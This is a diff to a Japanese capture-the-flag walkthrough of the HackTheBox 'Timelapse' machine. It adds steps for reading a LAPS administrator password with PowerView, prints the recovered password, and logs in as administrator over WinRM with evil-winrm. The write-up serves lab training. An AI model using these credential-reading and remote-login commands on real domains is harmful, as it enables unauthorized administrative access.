@@ -125,3 +125,31 @@ openssl pkcs12 -in htb/timelapse/legacyy_dev_auth.pfx -nokeys -out htb/timelapse
 ```bash
 type Desktop/user.txt
 ```
+
+## svc_deploy
+
+![img](ConsoleHost_history.png)
+
+## ReadLAPSPassword
+
+```bash
+Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
+```
+
+[ReadLAPSPassword | SpecterOps](https://bloodhound.specterops.io/resources/edges/read-laps-password)
+
+パスワードが`Gp&/n0ibz2JRQ4{GSTJ);P;0`であることがわかります。
+
+
+## WinRM経由での接続
+
+```bash
+evil-winrm -u administrator -p 'Gp&/n0ibz2JRQ4{GSTJ);P;0' -i <RHOST> -S
+```
+
+![img](evil-winrm2.png)
+
+
+
+## rootフラグの取得
+
